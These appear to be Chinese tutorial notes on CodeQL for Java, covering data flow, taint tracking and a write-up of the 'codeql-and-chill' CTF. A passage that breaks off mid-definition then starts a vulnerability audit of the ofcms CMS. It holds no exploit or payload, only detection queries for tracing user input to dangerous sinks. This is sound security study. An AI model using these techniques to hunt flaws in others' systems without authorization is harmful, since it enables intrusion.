Annotatable \u662fannotations\u5728codeql\u4e2d\u7684\u9876\u7ea7\u7c7b\u3002\u5305\u62ec\u5305\u3001\u5f15\u7528\u7c7b\u578b\u3001\u5b57\u6bb5\u3001\u65b9\u6cd5\u3001\u6784\u9020\u5668\u548c\u5c40\u90e8\u53d8\u91cf\u58f0\u660e\uff0c\u53ef\u4ee5\u901a\u8fc7\u7a0b\u5e8f\u5143\u7d20\u7684\u8c13\u8bcd getAnAnnotation \u6765\u83b7\u53d6\u3002 \u5bf9\u4e8e\u50cf@xxx \u8fd9\u79cd\u6ce8\u91ca\uff0c\u5b83\u4eec\u90fd\u88ab\u5305\u542b\u5728 Annotation \u8fd9\u4e2a\u7c7b\u4e2d\uff0c getAnAnnotation \u83b7\u53d6\u5230\u7684\u4fbf\u662f Annotation \u5bf9\u8c61\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 Annotation \u7684gettype\u65b9\u6cd5\u83b7\u53d6\u8fd9\u4e2a\u6ce8\u91ca\u7684\u7c7b\u578b\u3002 \u6307\u6807Metrics \u53ef\u4ee5\u7528\u6765\u67e5\u8be2\"\u5faa\u73af\u590d\u6742\u5ea6\u5927\u4e8e40\u7684\u65b9\u6cd5\"\u7b49\u7c7b\u4f3c\u7684\u4e1c\u897f \u8c03\u7528\u5173\u7cfbCall Gragh \u6bcf\u5f53\u4e00\u6b21\u6784\u9020\u65b9\u6cd5\u6216\u8005\u65b9\u6cd5\u88ab\u8c03\u7528\u65f6\uff0c\u5c31\u4f1a\u4ea7\u751f\u4e00\u6b21\u65b9\u6cd5\u8c03\u7528\uff08\u7528\u7c7b Call\u8868\u793a\uff09 \u6211\u4eec\u53ef\u4ee5\u7528Call.getCallee\u6765\u83b7\u53d6\u88ab\u8c03\u7528\u7684\u65b9\u6cd5\u540d \u540c\u65f6\u8fd8\u6709\u4e00\u4e2a\u7c7bCallable\u8868\u793a\u6240\u6709\u53ef\u88ab\u8c03\u7528\u7684\u65b9\u6cd5\uff0c Callable.getAReference \u53ef\u4ee5\u83b7\u53d6\u5b83\u5728\u54ea\u91cc\u88ab\u8c03\u7528\u4e86\uff0c\u8fd4\u56de\u4e00\u4e2aCall\u5bf9\u8c61\u3002\u6211\u4eec\u53ef\u4ee5\u7528\u4e0b\u9762\u7684query\u83b7\u53d6\u672a\u88ab\u8c03\u7528\u8fc7\u7684\u65b9\u6cd5\u3002 import java from Callable c where not exists(c.getAReference()) select c \u5173\u4e8eCall\u548cCallable\uff0c\u5b98\u65b9\u7ed9\u4e86\u4e2a\u4f8b\u5b50\u7528\u4e8e\u5206\u8fa8 class Super { int x; // callable public Super() { this(23); // call } // callable public Super(int x) { this.x = x; } // callable public int getX() { return x; } } class Sub extends Super { // callable public Sub(int x) { super(x+19); // call } // callable public int getX() { return x-19; } } class Client { // callable public static void main(String[] args) { Super s = new Sub(42); // call s.getX(); // call } } Call\u6709\u4e24\u4e2a\u91cd\u8981\u8c13\u8bcd getCallee\u548cgetCaller\u3002 \u4e2a\u4eba\u8ba4\u4e3agetCallee\u662f\u83b7\u53d6\u65b9\u6cd5\u8c03\u7528\u4e2d\u6240\u8c03\u7528\u7684\u65b9\u6cd5\uff0cgetCaller\u662f\u83b7\u53d6\u662f\u5728\u54ea\u4e2a\u65b9\u6cd5\u5185\u90e8\u4ea7\u751f\u7684\u65b9\u6cd5\u8c03\u7528 Callable\u6709\u4e2a\u91cd\u8981\u8c13\u8bcd\uff1apolyCalls(Callable target)\uff0c\u5982\u679c\u53c2\u6570\u4e2d\u7684target\u6216\u5176\u91cd\u5199\u65b9\u6cd5\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u88ab\u8c03\u7528\u4e86\uff0c\u90a3\u4e48\u5c31\u4f1a\u8fd4\u56de\u6210\u529f\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u6b64\u6765\u68c0\u6d4b\u7a0b\u5e8f\u4e2d\u672a\u7ecf\u8c03\u7528\u8fc7\u7684\u65b9\u6cd5\u3002 import java from Callable callee where not exists(Callable caller | caller.polyCalls(callee)) select callee java\u6570\u636e\u6d41\u5206\u6790 \u5c40\u90e8\u6570\u636e\u6d41Local data flow \u5c40\u90e8\u6570\u636e\u6d41\u662f\u6307\u4e00\u4e2a\u65b9\u6cd5\u6216\u8005\u4e00\u4e2a\u8c03\u7528\u5185\u7684\u6570\u636e\u6d41\uff0c\u5b83\u5728\u5904\u7406\u8bb8\u591a\u67e5\u8be2\u65f6\u6bd4\u5168\u5c40\u6570\u636e\u6d41\u66f4\u7b80\u5355\u3001\u5feb\u901f\u548c\u7cbe\u786e\u3002 \u5c40\u90e8\u6570\u636e\u6d41\u7684\u76f8\u5173\u5e93\u4f4d\u4e8eDataFlow\u6a21\u5757\uff0c\u9700\u8981\u5bfc\u5165 import semmle.code.java.dataflow.DataFlow \u6570\u636e\u6d41\u8282\u70b9\u6307\u6570\u636e\u80fd\u6d41\u7ecf\u7684\u6240\u6709\u8282\u70b9\uff0c\u6570\u636e\u6d41\u8282\u70b9\u5206\u4e3a\u8868\u8fbe\u5f0f\u8282\u70b9\uff08ExprNode\uff09\u548c\u53c2\u6570\u8282\u70b9\uff08ParamterNode\uff09 \u5728DataFlow::Node\u4e2d\u6709\u4e24\u4e2a\u5173\u952e\u8c13\u8bcd\uff0c\u53ef\u4ee5\u8ba9\u6570\u636e\u6d41\u8282\u70b9\u8f6c\u4e3aExpr\u6216Parameter\u5f62\u5f0f class Node { // \u83b7\u53d6\u6570\u636e\u6d41\u8282\u70b9Expr\u7684\u5f62\u5f0f Expr asExpr() { ... } // \u83b7\u53d6\u6570\u636e\u6d41\u8282\u70b9Parameter\u7684\u5f62\u5f0f Parameter asParameter() { ... } } \u4e5f\u6709\u8c13\u8bcdexprNode\u548cparameterNode \u80fd\u628aExpr\u6216Parameter\u5f62\u5f0f\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684ExprNode\u8282\u70b9ParamterNode\u8282\u70b9 \u4f7f\u7528\u5c40\u90e8\u6570\u636e\u6d41 \u6709\u8c13\u8bcd localFlowStep(Node nodeFrom, Node nodeTo) \uff0c\u53ef\u4ee5\u5728\u7528\u6765\u9650\u5b9a\u4ece nodeFrom \u5230 nodeTo \u7684\u6570\u636e\u6d41\uff08\u591a\u7528\u4e8ewhere\u5b50\u53e5\uff09\u3002 \u6211\u4eec\u53ef\u4ee5\u7528\u9012\u5f52\u64cd\u4f5c\u7b26+\u6216*\u6765\u9012\u5f52\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u50cf\u8fd9\u6837localFlowStep* localFlow\u76f8\u5f53\u4e8elocalFlowStep *\u3002 \u53ef\u4ee5\u7528\u5982\u4e0b\u8bed\u53e5\u6765\u9650\u5b9a\u4ecesource\u6d41\u5411sink\u7684\u6570\u636e\u6d41 DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink)) \u518d\u6bd4\u5982\u8bf4\u53ef\u4ee5\u7528\u4ee5\u4e0b\u8bed\u53e5\u67e5\u8be2\u4ece\u53c2\u6570\u8282\u70b9\u5230\u8868\u8fbe\u5f0f\u8282\u70b9\u7684\u6570\u636e\u6d41 \u5c40\u90e8\u6c61\u70b9\u8ffd\u8e2alocal taint tracking \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u8ffd\u8e2a\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u5bf9\u8c61 X\u3002 \u968f\u7740\u7a0b\u5e8f\u7684\u8fdb\u884c\uff0cX\u6765\u5230\u4e86\u8fd9\u6837\u7684\u4ee3\u7801\u4e2d\uff1a y=X+1\u3002 \u7531\u4e8ey\u662f\u7531X\u6d3e\u751f\u7684\uff0c\u5b83\u88abX\u611f\u67d3\u5f71\u54cd\u4e86\uff0c\u6240\u4ee5\u5b83\u4e5f\u5df2\u7ecf\u6210\u4e3a\u4e86\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u5bf9\u8c61 \u4f20\u7edf\u7684\u6570\u636e\u6d41\u5206\u6790\u4f1a\u7740\u91cd\u4e8eX\u672c\u8eab\uff0c\u800c\u4e0d\u4f1a\u6ce8\u610f\u5230y\uff0c\u5b83\u53ef\u80fd\u4f1a\u53ea\u6ce8\u610fX\u6709\u53ef\u80fd\u6210\u4e3a\u54ea\u4e9b\u503c\u3002 \u800c\u6c61\u70b9\u8ddf\u8e2a\u5219\u4f1a\u5206\u6790y\uff0c\u56e0\u4e3ay\u4e5f\u88ab\u6c61\u70b9\u6240\u6c61\u67d3\u4e86\uff0c\u5206\u6790\u6c61\u70b9\u4ecex\u6d41\u5411y\u7684\u8fc7\u7a0b\u4fbf\u662f\u6c61\u70b9\u8ffd\u8e2a \u6c61\u70b9\u8ffd\u8e2a\u76f8\u5173\u5e93 import semmle.code.java.dataflow.TaintTracking \u6c61\u70b9\u8ffd\u8e2a\u5e93\u548c\u6570\u636e\u6d41\u5206\u6790\u6240\u7528\u7684\u65b9\u6cd5\u7c7b\u4f3c localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) localTaintStep* \u5c01\u88c5\u6210\u4e86localTaint \u6211\u4eec\u5199\u4e00\u4e2ademo\u5bf9parameterNode\u5230exprNode\u7684\u6570\u636e\u6d41\u8fdb\u884c\u6c61\u70b9\u8ffd\u8e2a import java import semmle.code.java.dataflow.DataFlow import semmle.code.java.dataflow.TaintTracking from Parameter source, Expr sink where TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink)) select source,sink \u5168\u5c40\u6570\u636e\u6d41Global data flow \u8ffd\u8e2a\u6574\u4e2a\u9879\u76ee\u4e2d\u7684\u6570\u636e\u6d41\uff0c\u6bd4\u5c40\u90e8\u6570\u636e\u6d41\u66f4\u52a0\u5f3a\u5927\u4f46\u4e5f\u66f4\u8d39\u65f6\u3002 \u8981\u4f7f\u7528\u5168\u5c40\u6570\u636e\u6d41\u8fdb\u884c\u5206\u6790\uff0c\u9700\u8981\u7528\u5230 DataFlow::Configuration \u6765\u6307\u5b9asource\u548csink\u3002 \u6211\u4eec\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7ee7\u627f\u81ea\u5b83\u7684class\u5e76\u8fdb\u884c\u65b9\u6cd5\u7684\u91cd\u5199\uff0c\u540c\u65f6\u4e5f\u5199\u4e00\u4e2a\u6784\u9020\u65b9\u6cd5\u6307\u5b9a\u8fd9\u4e2aConfiguration \u7684\u540d\u5b57\uff08\u8fd9\u4e2a\u540d\u5b57\u5e94\u8be5\u662f\u552f\u4e00\u7684\uff09\u3002 import semmle.code.java.dataflow.DataFlow class MyDataFlowConfiguration extends DataFlow::Configuration { MyDataFlowConfiguration() { this = \"MyDataFlowConfiguration\" } override predicate isSource(DataFlow::Node source) { ... } override predicate isSink(DataFlow::Node sink) { ... } } \u9664\u4e86\u91cd\u5199isSource\u548cisSink\u6765\u6307\u5b9asource\u548csink\u5916\uff0c\u8fd8\u53ef\u4ee5\u9009\u62e9\u6027\u7684\u91cd\u5199isBarrier\u6765\u4e2d\u65ad\u6570\u636e\u6d41\uff0cisAdditionalFlowStep\u6765\u6dfb\u52a0\u989d\u5916\u7684\u6570\u636e\u6d41\u6b65\u9aa4\uff0c\u6216\u8005\u662f\u5ef6\u7eed\u6570\u636e\u6d41\u3002 \u968f\u540e\u7528from..where..select \u67e5\u8be2 from MyDataFlowConfiguration dataflow, DataFlow::Node source, DataFlow::Node sink where dataflow.hasFlow(source, sink) select source, \"Data flow to $@.\", sink, sink.toString() \u5168\u5c40\u6c61\u70b9\u8ffd\u8e2aglobal taint tracking \u548c\u5168\u5c40\u6570\u636e\u6d41\u7c7b\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u7ee7\u627f\u7c7b\u6362\u6210\u4e86 TaintTracking::Configuration \u6570\u636e\u6e90 codeql\u5185\u90e8\u5b9a\u4e49\u4e86\u4e00\u4e9b\u6570\u636e\u6e90\u6765\u8f85\u52a9\u5206\u6790\uff0c\u5982semmle.code.java.dataflow.FlowSources\u6a21\u5757\u4e2d\u7684 RemoteFlowSource \u7c7b\u5c31\u9884\u5b9a\u4e49\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684\u7528\u6237\u8f93\u5165\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u62ff\u6765\u7528 override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource } java\u4e2d\u7684Type \u5728java\u5e93\u5c0f\u8282\u4e2d\u7684\u5143\u7d20\u4e00\u8282\u4e2d\u63d0\u5230\u8fc7Type\u8fd9\u4e2a\u4e1c\u897f\uff0c\u8fd9\u91cc\u66f4\u52a0\u6df1\u5165\u7684\u7406\u89e3\u8fd9\u4e2a\u4e1c\u897f\u662f\u4ec0\u4e48\u3002 Type\u5206\u4e3a\u4ee3\u8868boolen\u3001byte\u7b49\u57fa\u672c\u7c7b\u578b\u7684 PrimitiveType \u548c\u4ee3\u8868class\u3001interface\u3001array\u7b49\u7684 RefType \u3002 \u5bf9\u4e8eRefType\u6211\u4eec\u53ef\u4ee5\u7528 getASupertype \u548c getASubtype \u6765\u83b7\u53d6\u5176\u7236\u7c7b\u6216\u5b50\u7c7b\uff08extends\u548cimplement\uff09 \u4e5f\u63d0\u4f9b\u4e86 getAMember \u8fd9\u4e2a\u8c13\u8bcd\u53bb\u83b7\u53d6Type\u5185\u90e8\u6210\u5458\uff08\u5982\u5b57\u6bb5\u3001\u65b9\u6cd5\u3001\u6784\u9020\u65b9\u6cd5\uff09 \u4e5f\u63d0\u4f9b\u4e86 inherits(Method m) \u6765\u68c0\u67e5type\u5185\u90e8\u6216\u8005\u5176\u5b50\u7c7b\u91cc\u662f\u5426\u5b9a\u4e49\u4e86\u65b9\u6cd5m java\u4e2d\u5b58\u5728\u7740\u8bb8\u591a\u5f3a\u8f6c\u578b\uff0c\u4f46\u662f\u5411\u4e0b\u8f6c\u578b\u6709\u4e9b\u65f6\u5019\u662f\u5371\u9669\u7684\uff08\u5982Object\u5bf9\u8c61\u5411String\u5f3a\u8f6c\u578b\uff09\uff0c\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u627e\u51fa\u6765 CastExprt \u5c31\u662f\u4e00\u4e2a\u4ee3\u8868\u5f3a\u8f6c\u578b\u7684\u8868\u8fbe\u5f0f\uff0c\u4ee3\u8868\u5982 (int) i\u8fd9\u79cd\u3002 import java from CastExpr ce, Expr source, Expr target where source.getType() = ce.getExpr().getType()and //\u5f97\u5230\u5f3a\u8f6c\u578b\u4e2d\u5c06\u8981\u88ab\u5f3a\u8f6c\u578b\u7684\u5bf9\u8c61\u7684Type\uff0c\u5982(int)i \u4e2d\u7684i target.getType() = ce.getType() and //\u5f97\u5230\u5f3a\u8f6c\u578b\u4e2d\u8f6c\u53d8\u7684\u76ee\u6807\u5bf9\u8c61\u7684Type,\u5982\uff08int\uff09i\u4e2d\u7684int target.getType().(RefType).getASupertype+() = source.getType() select ce, \"Potentially problematic array downcast.\" Codeql \u5b9e\u64cd codeql lab java \u7ec3\u7ec3\u624b\u5199\u4e2awp https://securitylab.github.com/ctf/codeql-and-chill/ 1.1 :Sources \u5c06javax.validation.ConstraintValidator\u63a5\u53e3\u4e0bisValid\u65b9\u6cd5\u7684\u6240\u6709\u8986\u5199\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u8bbe\u7f6e\u4e3asource predicate isSource(DataFlow::Node source) { exists(Method a| a.getASourceOverriddenMethod().hasQualifiedName(\"javax.validation\", \"ConstraintValidator\", \"isValid\") and source.asParameter()=a.getParameter(0) ) } //getASourceOverriddenMethod \u83b7\u53d6\u4e00\u4e2a\u8986\u5199\u65b9\u6cd5\u7684\u521d\u59cb\u58f0\u660e\u65b9\u6cd5 \u8fd4\u56de6\u4e2a\u7ed3\u679c 1.2 :sink \u83b7\u53d6\u8c03\u7528ConstraintValidatorContext.buildConstraintViolationWithTemplate\u8fd9\u4e2a\u65b9\u6cd5\u65f6\u7684\u7b2c\u4e00\u4e2a\u4f20\u5165\u7684\u53c2\u6570 override predicate isSink(DataFlow::Node sink) { exists(Call call| call.getCallee().getQualifiedName().matches(\"ConstraintValidatorContext.buildConstraintViolationWithTemplate\") and sink.asExpr()=call.getArgument(0) ) } \u8fd4\u56de5\u4e2a\u7ed3\u679c 1.3: TaintTracking configuration \u5c06\u521a\u521a\u7684source\u548csink\u6c47\u603b\u8fdb\u884c\u6c61\u70b9\u8ffd\u8e2a import java import semmle.code.java.dataflow.TaintTracking class Myconf extends TaintTracking::Configuration { Myconf() { this = \"Myconf\" } override predicate isSource(DataFlow::Node source) { exists(Method a| a.getASourceOverriddenMethod().hasQualifiedName(\"javax.validation\", \"ConstraintValidator\", \"isValid\") and source.asParameter()=a.getParameter(0) ) } override predicate isSink(DataFlow::Node sink) { exists(Call call| call.getCallee().getQualifiedName().matches(\"ConstraintValidatorContext.buildConstraintViolationWithTemplate\") and sink.asExpr()=call.getArgument(0) ) } } //There has to be a query in scope even when you use Quick Evaluation from Myconf conf,DataFlow::Node source,DataFlow::Node sink where conf.hasFlow(source, sink) select source,sink \u8fd4\u56de0\u4e2a\u7ed3\u679c 1.4: Partial Flow to the rescue Partial Flow \u5728codeql\u4e2d\u7c7b\u4f3c\u4e00\u79cd\u8c03\u8bd5\u624b\u6cd5\u3002 \u6211\u4eec\u53ef\u4ee5\u7ed9\u5b9a\u4e00\u4e2a\u521d\u59cbsource\uff0c\u4ee5\u53ca\u641c\u7d22\u957f\u5ea6\uff0c\u518d\u4f7f\u7528Partial query\u5c31\u53ef\u4ee5\u63a2\u6d4b\u51fa\u8be5source\u5ef6\u7533\u6307\u5b9a\u957f\u5ea6\u6240\u5f97\u5230\u7684\u4efb\u4f55sink\u3002 \u5728\u4e0a\u4e00\u5c0f\u8282\u7684\u6d4b\u8bd5\u4e2d\u8fd4\u56de\u4e860\u6761\u7ed3\u679c\uff0c\u6211\u4eec\u63a8\u6d4b\u53ef\u80fd\u662f\u4ecesource\u5230sink\u7684\u8def\u5f84\u65ad\u5f00\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7Partial query\u6765\u67e5\u627e\u662f\u4ece\u54ea\u91cc\u65ad\u5f00\u7684\u3002 \u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6esource\u4e3ajavax.validation.ConstraintValidator \u7684isValid\u65b9\u6cd5\u4e2d\u7b2c\u4e00\u4e2a\u4e14\u540d\u4e3acontainer\u7684\u53c2\u6570\u8fdb\u884c\u67e5\u8be2\u3002 /** * @kind path-problem */ import java import semmle.code.java.dataflow.TaintTracking class Myconf extends TaintTracking::Configuration { override int explorationLimit() { result = 5 } //\u6307\u5b9a\u641c\u7d22\u957f\u5ea6 Myconf() { this = \"Myconf\" } override predicate isSource(DataFlow::Node source) { exists(Method a| a.getASourceOverriddenMethod().hasQualifiedName(\"javax.validation\", \"ConstraintValidator\", \"isValid\") and source.asParameter()=a.getParameter(0) ) } override predicate isSink(DataFlow::Node sink) { exists(Call call| call.getCallee().getQualifiedName().matches(\"ConstraintValidatorContext.buildConstraintViolationWithTemplate\") and sink.asExpr()=call.getArgument(0) ) } } //\u56fa\u5b9a\u53e5\u5f0f\uff0c\u6211\u4eec\u7ed9\u5b9a\u7684source\u662f\u540d\u4e3acontainer\u7684\u53c2\u6570\u8868\u8fbe\u5f0f from Myconf conf,DataFlow::PartialPathNode source,DataFlow::PartialPathNode sink where conf.hasPartialFlow(source, sink, _) and source.getNode().asParameter().getName()=\"container\" select source,sink \u67e5\u8be2\u7ed3\u679c\uff08\u5728\u6211\u6d4b\u8bd5\u6b64\u67e5\u8be2\u7684\u65f6\u5019\u901f\u5ea6\u5de8\u6162\uff0c\u4e0d\u77e5\u9053\u662f\u6211\u7684\u539f\u56e0\u8fd8\u662f\u4ec0\u4e48\uff09 \u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u7531\u53c2\u6570container\u5ef6\u7533\u51fa\u53bb\u7684\u6240\u6709sink\u3002 1.5: Adding additional taint steps \u4ece\u4e0a\u4e00\u5c0f\u8282\u7684\u7ed3\u679c\u53ef\u4ee5\u770b\u51fa\uff0c\u6570\u636e\u6d41\u6839\u672c\u5c31\u6ca1\u6709\u8fdb\u5165\u5230getHardConstraints\uff0cgetSoftConstraints\uff0ckeySet\u548cHashSet\u6784\u9020\u51fd\u6570\u5185\u90e8\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u6211\u4eec\u624b\u52a8\u94fe\u63a5\u8d77\u6765 1.6&1.7: Adding additional taint steps\\&Adding taint steps through a constructor \u6211\u4eec\u627e\u5230\u7f3a\u5931\u7684\u6570\u636e\u6d41\u8def\u5f84\u540e\u5c31\u53ef\u4ee5\u7740\u624b\u8fdb\u884c\u8fde\u63a5\u4e86\u3002 \u8981\u8fdb\u884c\u94fe\u63a5\u6211\u4eec\u9700\u8981\u5199\u4e00\u4e2a\u7ee7\u627f\u81eaTaintTracking::AdditionalTaintStep\u7684\u7c7b\u5e76\u4e14\u91cd\u5199\u5185\u90e8\u7684step\u65b9\u6cd5\u3002 \u5728step\u65b9\u6cd5\u6211\u4eec\u9700\u8981\u8bbe\u7f6e\u4e24\u4e2a\u6570\u636e\u6d41\u8282\u70b9\uff0c\u4f7f\u5176\u8fde\u63a5\u5728\u4e00\u8d77\u3002 \u4ee5getSoftConstraints\u4e3e\u4f8b \u6211\u4eec\u9700\u8981\u8bbe\u7f6enode1\u4e3acontainer\uff0cnode2\u4e3agetSoftConstraints\u7684\u8fd4\u56de\u503c\uff0c\u8fd9\u6837\u7684\u8bddgetSoftConstraints\u7684\u8fd4\u56de\u503c\u4e5f\u5c06\u6210\u4e3a\u6c61\u70b9 \u518d\u4ee5HashSet\u7684\u6784\u9020\u65b9\u6cd5\u4e3a\u4f8b\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6enode1\u4e3aHashSet\u521d\u59cb\u5316\u65f6\u7684\u53c2\u6570\uff0cnode2\u4e3a\u5176\u6784\u9020\u51fd\u6570\u7684\u8fd4\u56de\u503c class Fix extends TaintTracking::AdditionalTaintStep{ override predicate step(DataFlow::Node node1, DataFlow::Node node2) { exists(MethodAccess ma,Method m | (m.hasName(\"getHardConstraints\") or m.hasName(\"getSoftConstraints\") or m.hasName(\"keySet\")) and ma.getMethod()=m and node1.asExpr()=ma.getQualifier() and //getQualifier()\uff0c\u5982\u73b0\u6709\u65b9\u6cd5\u8c03\u7528 Foo.any() \u90a3\u4e48\u5bf9\u6b64\u65b9\u6cd5\u8c03\u7528\u6267\u884cgetQualifier\u5c31\u4f1a\u83b7\u5f97Foo\u8fd9\u4e2a\u8868\u8fbe\u5f0f node2.asExpr()=ma ) or exists( ConstructorCall cons| cons.getConstructor().getName().matches(\"HashSet%\") and node1.asExpr()=cons.getArgument(0) and node2.asExpr()=cons ) } } 1.8\uff1aFinish line for our first issue \u8fd4\u56de\u4e00\u6761\u7ed3\u679c /** * @kind path-problem */ import java import semmle.code.java.dataflow.TaintTracking import DataFlow::PathGraph class Myconf extends TaintTracking::Configuration { override int explorationLimit() { result = 5 } Myconf() { this = \"Myconf\" } override predicate isSource(DataFlow::Node source) { exists(Method a| a.getASourceOverriddenMethod().hasQualifiedName(\"javax.validation\", \"ConstraintValidator\", \"isValid\") and source.asParameter()=a.getParameter(0) ) } override predicate isSink(DataFlow::Node sink) { exists(Call call| call.getCallee().getQualifiedName().matches(\"ConstraintValidatorContext.buildConstraintViolationWithTemplate\") and sink.asExpr()=call.getArgument(0) ) } } class Fix extends TaintTracking::AdditionalTaintStep{ override predicate step(DataFlow::Node node1, DataFlow::Node node2) { exists(MethodAccess ma,Method m | (m.hasName(\"getHardConstraints\") or m.hasName(\"getSoftConstraints\") or m.hasName(\"keySet\")) and ma.getMethod()=m and node1.asExpr()=ma.getQualifier() and node2.asExpr()=ma ) or exists( ConstructorCall cons| cons.getConstructor().getName().matches(\"HashSet%\") and node1.asExpr()=cons.getArgument(0) and node2.asExpr()=cons ) } } from Myconf conf,DataFlow::PathNode source,DataFlow::PathNode sink where conf.hasFlowPath(source, sink) select sink, source, sink, \"Custom constraint error message contains unsanitized user data\" 3: Errors and Exceptions \u5982\u679csink\u4f20\u5165\u4e86\u9519\u8bef\u5f02\u5e38\u5904\u7406\u8bed\u53e5\u5757\u4e2d\u7684\u8bdd\uff0c\u6211\u4eec\u4e4b\u524d\u7684\u505a\u6cd5\u662f\u83b7\u53d6\u4e0d\u5230\u8fd9\u6837\u7684sink\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6539\u8fdb\u3002 try { parse(tainted); //source:tainted } catch (Exception e) { sink(e.getMessage()) //sink:getMessage } \u6211\u4eec\u5148\u660e\u786e\u8fd9\u51e0\u4e2a\u9700\u6c42 \u5bf9\u4e8esource \u9700\u8981source\u5728try\u8bed\u53e5\u5757\u5185\u90e8\u3001\u9700\u8981\u6b64try\u8bed\u53e5\u5757\u6709\u5bf9\u5e94\u7684catch\u8bed\u53e5\u5757\u3001\u9700\u8981source\u80fd\u629b\u51fa\u9519\u8bef\u4e14\u8be5\u9519\u8bef\u80fd\u88abcatch\u6355\u83b7 \u5bf9\u4e8esink \u9700\u8981sink\u4e3a\u7279\u5b9a\u540d\u5b57\u7684\u7684\u65b9\u6cd5\u3001\u9700\u8981sink\u7684\u5b9a\u8bed\u4e3acatch\u6355\u83b7\u5230\u7684\u9519\u8bef\u5bf9\u8c61 \u76f4\u63a5copy\u7684\u5b98\u65b9wp class ExceptionTaintStep extends TaintTracking::AdditionalTaintStep { override predicate step(DataFlow::Node n1, DataFlow::Node n2) { exists(Call call, TryStmt try, CatchClause catch, MethodAccess getMessageCall | // call\u5728try\u8bed\u53e5\u5757\u5185\u90e8\uff0c\u4e14try\u6709\u5bf9\u5e94\u7684catch call.getEnclosingStmt().getEnclosingStmt*() = try.getBlock() and try.getACatchClause() = catch and // call\u629b\u51fa\u9519\u8bef\u4e14\u8be5\u9519\u8bef\u80fd\u88abcatch\u6355\u83b7 ( catch.getACaughtType().getASupertype*() = call.getCallee().getAThrownExceptionType() or catch.getACaughtType().getASupertype*() instanceof TypeRuntimeException ) and // sink\u7684\u5b9a\u8bed\u4e3acatch\u6355\u83b7\u5230\u7684\u9519\u8bef\u5bf9\u8c61 catch.getVariable().getAnAccess() = getMessageCall.getQualifier() and //sink\u4e3a\u7279\u5b9a\u540d\u5b57\u7684\u7684\u65b9\u6cd5 getMessageCall.getMethod().getName().regexpMatch(\"get(Localized)?Message|toString\") and n1.asExpr() = call.getAnArgument() and n2.asExpr() = getMessageCall ) } } ofcms\u5ba1\u8ba1\u8bd5\u6c34 \u770b\u7f51\u4e0a\u6709\u5206\u6790\u6587\u7ae0\uff0c\u8ddf\u7740\u641e\u4e86\u4e00\u904d ref: https://www.anquanke.com/post/id/203674#h2-9 \u8bf4\u4e86\u90a3\u4e48\u4e45ctf,\u4e0d\u6765\u70b9\u5b9e\u6218\u5b9e\u5728\u662f\u4e0d\u7ed9\u52b2\uff0c\u5ba1\u5ba1\u8fd9\u4e2a\u73a9\u73a9 \u5148\u6765\u770b\u770bofcms\u7684\u6280\u672f\u6808 \u53d1\u73b0\u4f7f\u7528\u5230\u4e86jfinal\u8fd9\u4e2aMVC web\u6846\u67b6\u3002 \u90a3\u4e48ofcms\u4e5f\u5c31\u662fMVC\u67b6\u6784\u4e86\u3002\u6211\u4eec\u5148\u6765\u5173\u6ce8\u4e00\u4e0b\u5b83\u7684controller\u3002 \u56e0\u4e3aofcms\u7528\u5230\u4e86jfinal\u6846\u67b6\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u770b\u4e0bjfinal\u6846\u67b6\u4e2d\u7684controller\uff1a com.jfinal.core.Controller \u4ece\u7c7b\u578b\u7ed3\u6784\u53ef\u77e5ofcms\u7684\u6240\u6709controller\u90fd\u7ee7\u627f\u81eajfinal\u7684Controller\u3002 \u6211\u4eec\u53ef\u4ee5\u62ff\u8fd9\u4e9bcontroller\u7684getter\u65b9\u6cd5\u7684\u88ab\u8c03\u7528\u70b9\u4e3asource\u3002 \u5206\u6790\u4e86\u4e00\u4e0b\uff0c\u9009\u4e86\u8fd9\u51e0\u4e2aController com.jfinal.core.Controller\u3001com.ofsoft.cms.front.controller.BaseController\u3001com.ofsoft.cms.api.ApiBase\u4ee5\u53cacom.ofsoft.cms.admin.controller\u4e0b\u6240\u6709\u4ee5Controller\u7ed3\u5c3e\u7684class class ControllerGetter extends MethodAccess{ ControllerGetter(){ ( this.getMethod().getDeclaringType*().getQualifiedName().matches(\"com.ofsoft.cms.front.controller.BaseController\") and this.getMethod().getName().substring(0, 3)=\"get\" )or ( this.getMethod().getDeclaringType*().getQualifiedName().matches(\"com.ofsoft.cms.api.ApiBase\") and this.getMethod().getName().substring(0, 3)=\"get\" )or ( this.getMethod().getDeclaringType*().getQualifiedName().matches(\"com.ofsoft.cms.admin.controller.%Controller\") and this.getMethod().getName().substring(0, 3)=\"get\" )or ( this.getMethod().getDeclaringType*().getQualifiedName().matches(\"com.jfinal.core.Controller\") and this.getMethod().getName().substring(0, 3)=\"get\" ) } } sink\u7684\u5b9a\u4e49\u5c31\u591a\u4e86\u3002 \u6587\u4ef6\u7c7b \u6211\u4eec\u53ef\u4ee5\u5148\u5b9a\u4e49\u6587\u4ef6\u7c7b\u7684sink\uff0cjava\u7684\u6587\u4ef6\u7c7b\u64cd\u4f5c\u5927\u591a\u4f1a\u7528\u5230\u7c7bjava.io.File\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49sink\u4e3ajava.io.File\u7684\u6784\u9020\u65b9\u6cd5\u4e2d\u7684\u53c2\u6570 class SinkFile 